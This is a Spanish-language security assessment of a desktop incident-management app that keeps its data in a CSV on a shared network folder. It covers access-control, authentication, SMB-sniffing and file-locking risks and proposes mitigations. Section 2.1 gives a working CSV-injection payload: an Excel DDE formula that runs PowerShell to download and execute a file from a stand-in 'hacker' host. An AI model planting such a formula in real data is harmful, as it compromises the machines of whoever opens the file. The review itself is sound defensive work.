# Análisis de Seguridad: Vulnerabilidades y Riesgos (App de Incidencias)

Dado que la aplicación es un ejecutable de escritorio (`GestorIncidencias.exe`) que no expone puertos a Internet ni levanta un servidor web, la superficie de ataque para un *hacker externo* es muy reducida. Sin embargo, el **modelo de arquitectura elegido (archivo CSV en carpeta compartida de red)** presenta importantes riesgos de seguridad internos (y externos si la red no está bien aislada).

A continuación, se detallan las vulnerabilidades críticas encontradas y sus vectores de ataque:

---

## 🛑 1. Vulnerabilidades Críticas de la Arquitectura (SMB/Carpeta Compartida)

El principal riesgo de la aplicación reside en cómo se almacenan y comparten los datos.

### 1.1. Control de Acceso Inexistente (Confidencialidad e Integridad)
Para que la aplicación funcione, todos los empleados necesitan **permisos de Lectura y Escritura** sobre la carpeta compartida donde reside `incidencias.csv`. 
- **El Riesgo:** Cualquier empleado puede navegar a esa carpeta, abrir el `.csv` con el Bloc de notas o Excel, y **borrar todo el historial, alterar datos de otras personas, o robar la base de datos completa de clientes e incidencias**.
- **Ataque Externo (Ransomware):** Si un solo ordenador de la empresa se infecta con un ransomware (virus que encripta archivos), el virus viajará por la red y cifrará el `incidencias.csv`, destruyendo todo el trabajo.

### 1.2. Falta de Autenticación e Impersonación profunda
- **El Riesgo:** La aplicación permite elegir al "Usuario" desde un desplegable en `settings.json`. No hay contraseñas. Un atacante interno o externo con acceso al PC de un empleado puede registrar incidencias a nombre de otro, o cerrar incidencias críticas haciéndose pasar por alguien de soporte. No hay **Trazabilidad** ni Logs (Auditoría) reales.

### 1.3. Tráfico de Red sin Cifrar (Sniffing)
- **El Riesgo:** Si la red de la empresa utiliza versiones antiguas de SMB (SMBv1/SMBv2) o no tiene cifrado activado, un atacante conectado a la red WiFi o cableada puede usar herramientas (como Wireshark) para leer en texto plano todas las incidencias y contraseñas/datos confidenciales que los técnicos puedan estar escribiendo en el campo "Problema" o "Solución".

---

## 💉 2. Vulnerabilidades a Nivel de Código y Datos

### 2.1. Inyección de Fórmulas CSV (CSV Injection)
Esta es la vulnerabilidad más peligrosa a nivel de código actual.
- **El Vector:** Un empleado (o atacante) malintencionado crea una incidencia y en el campo de texto "Problema" escribe código malicioso que empieza por `=`, `+`, `-`, o `@`. Por ejemplo:
  `=cmd|'/C powershell IEX(wget http://hacker/virus.exe)'!A0`
- **El Impacto:** El CSV en sí es inofensivo en tu app Python, pero típicamente, los administradores o jefes acaban abriendo estos CSVs con **Microsoft Excel** para sacar estadísticas. Al abrirlo, Excel ejecutará ese comando de forma silenciosa, comprometiendo el PC del jefe.

### 2.2. Denegación de Servicio (DoS) por Bloqueo de Archivo
- **El Vector:** La lectura/escritura en red bloquea el archivo `.csv`. Has implementado un buen reintento (3 intentos de 0.5 segundos).
- **El Impacto:** Si un atacante (o un script en bucle) abre el `incidencias.csv` en la red y lo mantiene bloqueado intencionadamente con escritura exclusiva, tu aplicación petará para todos los usuarios legítimos devolviendo el error: `"El archivo CSV está siendo usado por otro programa o usuario."`

### 2.3. Exposición de Configuración
- Al compilar con PyInstaller usando `--add-data`, cualquiera puede hacer ingeniería inversa del `.exe` (con herramientas como `pyinstxtractor`) y extraer tu `settings.json`. Esto no es crítico aquí ya que el JSON solo tiene listas de usuarios, pero si el día de mañana pones contraseñas de API o de base de datos ahí dentro, estarán comprometidas.

---

## 🛡️ Propuestas de Mitigación

Si en el futuro deseas que la app sea "Enterprise Grade" (Nivel Empresarial Segura):

1. **Sustituir el CSV por una Base de Datos y un API Backend:**
   En lugar de dar permisos a los usuarios sobre una carpeta compartida, los usuarios solo tendrían permiso para conectarse a un programa intermediario (una API en Spring Boot, FastAPI, Node).
   - *Ventaja:* El empleado a nivel de red no puede borrar la base de datos (PostgreSQL/MySQL), el API controla quién es quién (Logins/Tokens), y no hay bloqueos de archivos.
2. **Sanitizar el CSV contra Excel:**
   Si mantienes el CSV, en `incidencias_controller.py`, asegúrate de escapar los caracteres peligrosos (`=`, `+`, etc) poniéndoles una comilla simple `'` delante antes de guardar.
3. **Copias de Seguridad (Backups):**
   Ya que cualquiera puede borrar el CSV, debes tener un script en el servidor que haga una copia del `incidencias.csv` a otra carpeta cada hora de forma imperceptible.
